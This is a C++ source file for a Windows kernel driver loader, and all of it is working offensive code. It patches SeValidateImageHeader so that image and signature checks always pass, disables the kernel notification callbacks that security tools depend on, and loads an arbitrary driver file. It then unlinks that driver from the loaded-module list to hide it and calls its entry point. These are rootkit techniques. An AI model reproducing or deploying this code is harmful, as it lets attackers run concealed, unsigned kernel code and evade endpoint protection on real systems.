#include "loader.hpp"
#include "hook.hpp"
#include "utils.hpp"

UNICODE_STRING ImagePath = RTL_CONSTANT_STRING(L"\\DosDevices\\C:\\test.sys");

tMmLoadSystemImage MmLoadSystemImage;

UINT32* PspNotifyEnableMask;
LIST_ENTRY* PsLoadedModuleList;
void* SeValidateImageHeader,
	*KeInitAmd64SpecificState,
	*ExpLicenseWatchInitWorker;

NTSTATUS Loader::LoadDriver() {
	// Patching nt!SeValidateImageHeader
	Utils::MemCpy(SeValidateImageHeader, (void*)"\x48\x31\xC0\xC3", 4); // xor rax, rax; ret

	// Disabling callbacks
	UINT32 PspNotifyEnableMaskOld = *PspNotifyEnableMask;
	*PspNotifyEnableMask = 0;

	// Loading driver into system driver space
	void* ModuleObject, *ImageBaseAddress;
	NTSTATUS Status = MmLoadSystemImage(&ImagePath, 0, 0, 0, &ModuleObject, &ImageBaseAddress);
	if (Status == STATUS_SUCCESS) {
		PLDR_DATA_TABLE_ENTRY LoadedDriver = nullptr, Module = (PLDR_DATA_TABLE_ENTRY)PsLoadedModuleList->Flink;
		do {
			if (Module->DllBase == ImageBaseAddress) {
				LoadedDriver = Module;
				break;
			}
			Module = (PLDR_DATA_TABLE_ENTRY)Module->InLoadOrderLinks.Flink;
		} while (Module != (PLDR_DATA_TABLE_ENTRY)PsLoadedModuleList->Flink || Module != nullptr);

		if (LoadedDriver) {
			// Removing driver from PsLoadedModuleList
			PLDR_DATA_TABLE_ENTRY PrevDriver = (PLDR_DATA_TABLE_ENTRY)LoadedDriver->InLoadOrderLinks.Blink;
			PLDR_DATA_TABLE_ENTRY NextDriver = (PLDR_DATA_TABLE_ENTRY)LoadedDriver->InLoadOrderLinks.Flink;

			PrevDriver->InLoadOrderLinks.Flink = (LIST_ENTRY*)NextDriver;
			NextDriver->InLoadOrderLinks.Blink = (LIST_ENTRY*)PrevDriver;

			// Invoking DriverEntry
			PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)LoadedDriver->DllBase;
			PIMAGE_NT_HEADERS64 Nt = (PIMAGE_NT_HEADERS64)((UINT64)Dos + Dos->e_lfanew);

			tDriverEntry DriverEntry = (tDriverEntry)((UINT64)LoadedDriver->DllBase + Nt->OptionalHeader.AddressOfEntryPoint);
			Status = DriverEntry(nullptr, nullptr);

			// Erasing PE header
			//Utils::MemSet(LoadedDriver->DllBase, 0, 0x1000);
		}
	}

	// Enabling callbacks
	*PspNotifyEnableMask = PspNotifyEnableMaskOld;

	// Restoring original bytes
	Utils::MemCpy(SeValidateImageHeader, (void*)"\x48\x8B\xC4\x48", 4);

	return Status;
}